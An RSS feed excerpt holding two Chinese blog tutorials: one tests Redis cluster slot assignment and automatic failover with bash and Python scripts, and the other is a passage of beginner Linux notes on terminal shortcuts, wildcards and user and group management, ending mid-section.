<item>
<title>Redis集群以及自动故障转移测试 - MSSQL123</title>
<link>http://www.cnblogs.com/wy123/p/10325904.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wy123/p/10325904.html</guid>
<description>
&lt;p&gt;在Redis中，与Sentinel（哨兵）实现的高可用相比，集群（cluster）更多的是强调数据的分片或者是节点的伸缩性，如果在集群的主节点上加入对应的从节点，集群还可以自动故障转移，因此相比Sentinel（哨兵）还是有不少优势的。&lt;br/&gt;以下简单测试Redis的集群（单机多实例的模式），来体验一下集群的自动故障转移功能，同时结合Python，来观察自动故障转移过程中应用程序端的表现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;redis集群实例安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;启动6个redis集群实例，集群模式，除了正常的配置项目之外，需要在每个主节点中增加集群配置&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
cluster-enabled yes     　　&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 开启集群模&lt;/span&gt;
cluster-node-timeout 1000  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 节点超时时间，单位毫秒，设置一个较小的超时时间，目的是为了后面测试自动故障转移的效果&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127111825868-2017128478.png&quot; alt=&quot;&quot; width=&quot;719&quot; height=&quot;122&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分配slot &amp;amp; 主节点握手&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主节点分配slot给主节点，三个主节点分配16383个slot&lt;br/&gt;8001主-----&amp;gt;8004从&lt;br/&gt;8002主-----&amp;gt;8005从&lt;br/&gt;8003主-----&amp;gt;8006从&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;p&gt;#!/bin/bash&lt;br/&gt;for ((i=0;i&amp;lt;=16383;i++))&lt;br/&gt;do&lt;br/&gt;if [ $i -le 5461 ]; then&lt;br/&gt;　　/usr/local/redis5_1/bin/redis-cli -h 127.0.0.1 -p 8001 -a root CLUSTER ADDSLOTS $i&lt;br/&gt;elif [ $i -gt 5461 ]&amp;amp;&amp;amp;[ $i -le 10922 ]; then&lt;br/&gt;　　/usr/local/redis5_1/bin/redis-cli -h 127.0.0.1 -p 8002 -a root CLUSTER ADDSLOTS $i&lt;br/&gt;elif [ $i -gt 10922 ]; then&lt;br/&gt;　　/usr/local/redis5_1/bin/redis-cli -h 127.0.0.1 -p 8003 -a root CLUSTER ADDSLOTS $i&lt;br/&gt;fi&lt;br/&gt;done&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;分配完slot之后，在第一个主节点上执行cluster meet 127.0.0.1 8002，cluster meet 127.0.0.1 8003&lt;br/&gt;无须在其他两个主节点上meet另外两个主节点，随后三个主节点之间关系确定会自动确定，目前集群中是三个主节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127113711326-561528262.png&quot; alt=&quot;&quot; width=&quot;879&quot; height=&quot;406&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加主节点对应的从节点，需要登录到每个主节点的实例上，执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127114154674-86000052.png&quot; alt=&quot;&quot; width=&quot;403&quot; height=&quot;36&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127114216661-388016993.png&quot; alt=&quot;&quot; width=&quot;405&quot; height=&quot;37&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127114327640-1435946904.png&quot; alt=&quot;&quot; width=&quot;404&quot; height=&quot;36&quot;/&gt;&lt;/p&gt;
&lt;p&gt;三个从节点分别加入到主节点之后，此时6个节点全部加入到集群中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127114316842-151535823.png&quot; alt=&quot;&quot; width=&quot;1063&quot; height=&quot;433&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Python连接至集群测试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里需要安装redis-py-cluster依赖包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env python3&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; time &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ctime,sleep
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rediscluster &lt;span&gt;import&lt;/span&gt;&lt;span&gt; StrictRedisCluster

startup_nodes &lt;/span&gt;=&lt;span&gt; [
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8001&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8002&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8003&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8004&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8005&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8006&lt;span&gt;}
]
redis_conn&lt;/span&gt;= StrictRedisCluster(startup_nodes=startup_nodes, decode_responses=True,password=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;root&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(0, 100000&lt;span&gt;):
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        redis_conn.set(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; +&lt;span&gt; str(i), str(i))
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;setting name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + str(i) +&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;---&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + time.strftime(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;%Y-%m-%d %H:%M:%S&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,time.localtime(time.time())))
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;connect to redis cluster error&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        time.sleep(&lt;/span&gt;2)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行上述写入测试脚本之后，数据基本上均匀地落在三个节点上&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127120614542-638529817.png&quot; alt=&quot;&quot; width=&quot;787&quot; height=&quot;231&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;自动故障转移测试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;修改Python脚本，每隔1s写入一条数据，目的是便于观察在主节点宕机，集群自动故障转移这个时间段之之内（1s钟左右），对于应用程序的影响，或者说应用程序在自动故障转移前后的表现。&lt;br/&gt;如下脚本循环往Redis集群中写入数据，执行期间，强制杀掉一个主节点，观察应用程序连接情况。&lt;br/&gt;同时，如果发生异常，暂停应用程序2s，因为上面一开始配置的集群故障转移时间是1s，如果应用程序暂停2s，完全可以跳过故障转移的过程，&lt;br/&gt;当故障转移完成之后，应用程序又恢复成正常状态，虽然8001节点宕机，应用程序继续连接8001节点，但是应用程序完全无感知。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; time &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ctime,sleep
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rediscluster &lt;span&gt;import&lt;/span&gt;&lt;span&gt; StrictRedisCluster

startup_nodes &lt;/span&gt;=&lt;span&gt; [
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8001&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8002&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8003&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8004&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8005&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111.231.253.***&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:8006&lt;span&gt;}
]
redis_conn&lt;/span&gt;= StrictRedisCluster(startup_nodes=startup_nodes, decode_responses=True,password=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;root&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(0, 100000&lt;span&gt;):
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        redis_conn.set(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; +&lt;span&gt; str(i), str(i))
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;setting name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + str(i) +&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;---&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + time.strftime(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;%Y-%m-%d %H:%M:%S&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,time.localtime(time.time())))
        time.sleep(&lt;/span&gt;1&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;connect to redis cluster error&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        time.sleep(&lt;/span&gt;2)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;发现在杀掉主节点之后，仅发生了一次连接错误，随后因为Redis集群的自动故障转移成功，对应于程序来说是透明的，因此应用程序随后正常工作，不受其中一个主节点宕机的影响。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127121606702-1386460544.png&quot; alt=&quot;&quot; width=&quot;1112&quot; height=&quot;200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;集群此时的状态，8001节点宕机，明显，8001对应的从节点8004接管主节点，升级为master，对外提供服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127123246919-511756475.png&quot; alt=&quot;&quot; width=&quot;1122&quot; height=&quot;444&quot;/&gt;&lt;/p&gt;
&lt;p&gt;观察升级为主节点的8004实例日志，会发现在强制杀掉原8001主节点之后，1秒钟之内，成功替代8001升级为master节点&lt;br/&gt;如果在故障转移的过程中，没有应用程序访问Redis，应用程序甚至完全不知道Redis集群发生了故障转移，只要不发生集群中某一个节点的主从节点同时宕机，整个集群就没有问题，且对应用程序完全透明。&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127123806233-516970325.png&quot; alt=&quot;&quot; width=&quot;1132&quot; height=&quot;267&quot;/&gt;&lt;/p&gt;
&lt;p&gt;随后重启宕机的8001节点，会发现8001节点自动变为其原从节点（8004）的从节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/380271/201901/380271-20190127135209461-1478965759.png&quot; alt=&quot;&quot; width=&quot;1132&quot; height=&quot;409&quot;/&gt;&lt;/p&gt;
&lt;p&gt;整体上来看，Redis集群的配置和使用以及自动故障转移还是比较简单易容的，这里没有用redis-trib.rb 而是采用手动分配slot和创建集群的方式，目的是了解完整的配置流程。&lt;br/&gt;需要注意的是：&lt;br/&gt;1，如果开启了密码验证模式，所有的主从节点必须配置masterauth，因为某一个节点宕机重启之后，会自动变为从节点，此时如果想要从master复制数据，就必须需要主节点的密码&lt;br/&gt;2，StrictRedisCluster决定了所有主从节点的密码必须要是一样的。&lt;/p&gt;
&lt;p&gt;表面上看Redis集群简单易用，自动故障转移是没有问题的，保证了高可用，看似没有问题。&lt;br/&gt;如果细想，这个过程还是有问题的，有没有发现，虽然故障转移保证了高可用，但是当从节点升级为主节点之后，如果保证升级为主节点的从节点（8004）一定能够完全复制原主节点（8001）上的数据？&lt;/p&gt;
&lt;p&gt;这个就类似于MySQL的半同步复制，主节点上的数据，一定要同步（虽然是relaylog）到从节点，主节点才会提交。&lt;br/&gt;不过回头想想，取决于如何去对待Redis或者怎么使用Redis，Redis更多的时候是作为一个缓存使用，而不是落地的数据库，既然是缓存，就应该更多地去考虑性能。&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 06:27:00 +0000</pubDate>
<dc:creator>MSSQL123</dc:creator>
<og:description>在Redis中，与Sentinel（哨兵）实现的高可用相比，集群（cluster）更多的是强调数据的分片或者是节点的伸缩性，如果在集群的主节点上加入对应的从节点，集群还可以自动故障转移，因此相比Sen</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wy123/p/10325904.html</dc:identifier>
</item>
<item>
<title>一个.NET Core开发者的Linux入门学习笔记 - 依乐祝</title>
<link>http://www.cnblogs.com/yilezhu/p/10326367.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yilezhu/p/10326367.html</guid>
<description>&lt;p&gt;用.NET Core开发也有一段时间了，但是由于工作原因一直都是在Windows系统上进行的开发，一直想学习Linux然后把.NET Core开发的程序跑在Linux上，然后把心得体会记录一下发布再博客园，奈何拖延症泛滥，所以只写过一篇《&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/9891346.html&quot;&gt;CentOS开发ASP.NET Core入门教程&lt;/a&gt;》之后就继续征战Windows了！作为新年Flag之一就是学习Docker,K8S，虽然windows系统也能进行开发，但是毕竟Linux才是正途，因此这两天特地学习了一下Linux系统，并整理成这篇学习笔记，希望对.NET Core开发者学习Linux有所帮助。&lt;/p&gt;
&lt;blockquote readability=&quot;2.0987654320988&quot;&gt;
&lt;p&gt;作者：依乐祝&lt;br/&gt;原文链接：&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/10326367.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/yilezhu/p/10326367.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外如果你是一名.NET Core初学者，可以看一下我的《&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/9977862.html&quot;&gt;.NET Core实战项目之CMS 第一章 入门篇-开篇及总体规划&lt;/a&gt; 也可以加入.NET Core实战项目交流群637326624跟大家一起交流，共同进步！下面开始正文吧！内容有点长，希望你有耐心看完&lt;/p&gt;
&lt;h2 id=&quot;linux终端&quot;&gt;linux终端&lt;/h2&gt;
&lt;h3 id=&quot;终端的概念&quot;&gt;终端的概念&lt;/h3&gt;
&lt;p&gt;终端本质上是对应着 Linux 上的 /dev/tty 设备，Linux 的多用户登陆就是通过不同的 /dev/tty 设备完成的，Linux 默认提供了 6 个纯命令行界面的 “terminal”（准确的说这里应该是 6 个 virtual consoles）来让用户登录。在物理机系统上你可以通过使用[Ctrl]+[Alt]+[F1]～[F6]进行切换。&lt;/p&gt;
&lt;h3 id=&quot;shell&quot;&gt;Shell&lt;/h3&gt;
&lt;p&gt;通常在图形界面中对实际体验带来差异的不是不同发行版的各种终端模拟器，而是这个 Shell（壳）。有壳就有核，这里的核就是指 UNIX/Linux 内核，Shell 是指“提供给使用者使用界面”的软件（命令解析器），类似于 DOS 下的 command（命令行）和后来的 cmd.exe 。普通意义上的 Shell 就是可以接受用户输入命令的程序。它之所以被称作 Shell 是因为它隐藏了操作系统底层的细节。同样的 UNIX/Linux 下的图形用户界面 GNOME 和 KDE，有时也被叫做“虚拟 shell”或“图形 shell”。&lt;/p&gt;
&lt;h3 id=&quot;重要且常用的快捷键及技巧&quot;&gt;重要且常用的快捷键及技巧&lt;/h3&gt;
&lt;p&gt;1) 重要快捷键：&lt;br/&gt;&lt;strong&gt;[Tab]&lt;/strong&gt;&lt;br/&gt;使用Tab键来进行命令补全，Tab键一般是在字母Q旁边，这个技巧给你带来的最大的好处就是当你忘记某个命令的全称时可以只输入它的开头的一部分，然后按下Tab键就可以得到提示或者帮助完成：&lt;br/&gt;&lt;strong&gt;[Ctrl+c]&lt;/strong&gt;&lt;br/&gt;想想你有没有遇到过这种情况，当你在 Linux 命令行中无意输入了一个不知道的命令，或者错误地使用了一个命令，导致在终端里出现了你无法预料的情况，比如，屏幕上只有光标在闪烁却无法继续输入命令，或者不停地输出一大堆你不想要的结果。你想要立即停止并恢复到你可控的状态，那该怎么办呢？这时候你就可以使用Ctrl+c键来强行终止当前程序（你可以放心它并不会使终端退出）。&lt;br/&gt;其他一些常用快捷键&lt;br/&gt;按键 作用&lt;br/&gt;Ctrl+d 键盘输入结束或退出终端&lt;br/&gt;Ctrl+s 暂停当前程序，暂停后按下任意键恢复运行&lt;br/&gt;Ctrl+z 将当前程序放到后台运行，恢复到前台为命令fg&lt;br/&gt;Ctrl+a 将光标移至输入行头，相当于Home键&lt;br/&gt;Ctrl+e 将光标移至输入行末，相当于End键&lt;br/&gt;Ctrl+k 删除从光标所在位置到行末&lt;br/&gt;Alt+Backspace 向前删除一个单词&lt;br/&gt;Shift+PgUp 将终端显示向上滚动&lt;br/&gt;Shift+PgDn 将终端显示向下滚动&lt;/p&gt;
&lt;p&gt;2) 学会利用历史输入命令&lt;br/&gt;很简单，你可以使用键盘上的方向上键↑，恢复你之前输入过的命令，你一试便知。&lt;/p&gt;
&lt;p&gt;3) 学会使用通配符&lt;br/&gt;通配符是一种特殊语句，主要有星号（*）和问号（?），用来对字符串进行模糊匹配（比如文件名、参数名）。当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或者懒得输入完整名字时，常常使用通配符代替一个或多个真正字符。&lt;br/&gt;先使用 touch 命令创建 2 个文件，后缀都为 txt：&lt;/p&gt;
&lt;p&gt;$ touch adsfasd.txt wergjlkas.txt&lt;br/&gt;$ ls *.txt&lt;br/&gt;在创建文件的时候，如果需要一次性创建多个文件，比如：“love_1_linux.txt，love_2_linux.txt，... love_10_linux.txt”。在 Linux 中十分方便：&lt;br/&gt;$ touch love_{1..10}_linux.txt&lt;br/&gt;Shell 常用通配符：&lt;br/&gt;字符 含义&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;匹配 0 或多个字符&lt;br/&gt;匹配任意一个字符&lt;br/&gt;list] 匹配 list 中的任意单一字符&lt;br/&gt;!list] 匹配 除list 中的任意单一字符以外的字符&lt;br/&gt;c1-c2] 匹配 c1-c2 中的任意单一字符 如：[0-9][a-z]&lt;br/&gt;string1,string2,...} 匹配 string1 或 string2 (或更多)其一字符串&lt;br/&gt;c1..c2} 匹配 c1-c2 中全部字符 如{1..10}&lt;br/&gt;4) 学会在命令行中获取帮助&lt;br/&gt;在 Linux 环境中，如果你遇到困难，可以使用man命令，它是Manual pages的缩写。&lt;br/&gt;$ man&lt;br/&gt;$ man 1 ls&lt;br/&gt;会显示第一区段中的ls命令 man 页面。&lt;br/&gt;man 手册的内容很多，涉及了 Linux 使用过程中的方方面面。为了便于查找，man 手册被进行了分册（分区段）处理，在 Research UNIX、BSD、OS X 和 Linux 中，手册通常被分为8个区段&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;linux-用户管理&quot;&gt;Linux 用户管理&lt;/h2&gt;
&lt;h3 id=&quot;用户管理&quot;&gt;用户管理&lt;/h3&gt;
&lt;p&gt;请打开终端，输入命令：&lt;br/&gt;$ who am i&lt;br/&gt;或者&lt;br/&gt;$ who mom likes&lt;br/&gt;who 命令其它常用参数&lt;br/&gt;参数 说明&lt;br/&gt;-a 打印能打印的全部&lt;br/&gt;-d 打印死掉的进程&lt;br/&gt;-m 同am i,mom likes&lt;br/&gt;-q 打印当前登录用户数及用户名&lt;br/&gt;-u 打印当前登录用户登录信息&lt;br/&gt;-r 打印运行等级&lt;/p&gt;
&lt;h3 id=&quot;创建用户&quot;&gt;创建用户&lt;/h3&gt;
&lt;p&gt;在 Linux 系统里， root 账户拥有整个系统至高无上的权利，比如 新建/添加 用户。&lt;br/&gt;su，su- 与 sudo&lt;br/&gt;su 可以切换到用户 user，执行时需要输入目标用户的密码，sudo 可以以特权级别运行 cmd 命令，需要当前用户属于 sudo 组，且需要输入当前用户的密码。su - 命令也是切换用户，同时环境变量也会跟着改变成目标用户的环境变量。&lt;br/&gt;现在我们新建一个叫 yilezhu 的用户：&lt;br/&gt;$ sudo adduser yilezhu&lt;br/&gt;这个命令不但可以添加用户到系统，同时也会默认为新用户创建 home 目录：&lt;br/&gt;$ ls /home&lt;br/&gt;现在你已经创建好一个用户，并且你可以使用你创建的用户登录了，使用如下命令切换登录用户：&lt;br/&gt;$ su -l yilezhu&lt;br/&gt;退出当前用户跟退出终端一样可以使用 exit 命令或者使用快捷键 Ctrl+d。&lt;/p&gt;
&lt;h3 id=&quot;用户组&quot;&gt;用户组&lt;/h3&gt;
&lt;p&gt;在 Linux 里面每个用户都有一个归属（用户组），用户组简单地理解就是一组用户的集合，它们共享一些资源和权限，同时拥有私有资源，就跟家的形式差不多，你的兄弟姐妹（不同的用户）属于同一个家（用户组），你们可以共同拥有这个家（共享资源），爸妈对待你们都一样（共享权限），你偶尔写写日记，其他人未经允许不能查看（私有资源和权限）。当然一个用户是可以属于多个用户组的，正如你既属于家庭，又属于学校或公司。&lt;br/&gt;方法一：使用 groups 命令&lt;br/&gt;$ groups yilezhu&lt;br/&gt;可以查看下 /etc/sudoers.d/yilezhu 文件，我们在 /etc/sudoers.d 目录下创建了这个文件，从而给 yilezhu 用户赋予了 sudo 权限：&lt;br/&gt;$sudo cat /etc/sudoers.d/yilezhu&lt;br/&gt;方法二：查看 /etc/group 文件&lt;br/&gt;$ cat /etc/group | sort&lt;br/&gt;这里 cat 命令用于读取指定文件的内容并打印到终端输出，后面会详细讲它的使用。 | sort 表示将读取的文本进行一个字典排序再输出&lt;br/&gt;没找到，没关系，你可以使用命令过滤掉一些你不想看到的结果：&lt;br/&gt;$ cat /etc/group | grep -E &quot;yilezhu&quot;&lt;br/&gt;/etc/group 的内容包括用户组（Group）、用户组口令、GID 及该用户组所包含的用户（User），每个用户组一条记录。格式如下：&lt;br/&gt;group_name:password:GID:user_list&lt;br/&gt;你看到上面的 password 字段为一个 x 并不是说密码就是它，只是表示密码不可见而已。&lt;br/&gt;将其它用户加入 sudo 用户组&lt;br/&gt;默认情况下新创建的用户是不具有 root 权限的，也不在 sudo 用户组，可以让其加入 sudo 用户组从而获取 root 权限：&lt;br/&gt;$ su -l yilezhu&lt;br/&gt;$ sudo ls&lt;br/&gt;会提示 lilei 不在 sudoers 文件中，意思就是 lilei 不在 sudo 用户组中，至于 sudoers 文件（/etc/sudoers）你现在最好不要动它，操作不慎会导致比较麻烦的后果。&lt;br/&gt;使用 usermod 命令可以为用户添加用户组，同样使用该命令你必需有 root 权限，你可以直接使用 root 用户为其它用户添加用户组，或者用其它已经在 sudo 用户组的用户使用 sudo 命令获取权限来执行该命令。&lt;br/&gt;这里我用 root 用户执行 sudo 命令将 yilezhu 添加到 sudo 用户组，让它也可以使用 sudo 命令获得 root 权限：&lt;br/&gt;$ su root # 此处需要输入root用户密码&lt;br/&gt;$ groups yilezhu&lt;br/&gt;$ sudo usermod -G sudo yilezhu&lt;br/&gt;$ groups yilezhu&lt;br/&gt;然后你再切换回 yilezhu 用户，现在就可以使用 sudo 获取 root 权限了。&lt;/p&gt;
&lt;h3 id=&quot;删除用户&quot;&gt;删除用户&lt;/h3&gt;
&lt;p&gt;删除用户是很简单的事：&lt;br/&gt;$ sudo userdel -rf yilezhu&lt;/p&gt;
&lt;h3 id=&quot;拓展&quot;&gt;拓展&lt;/h3&gt;
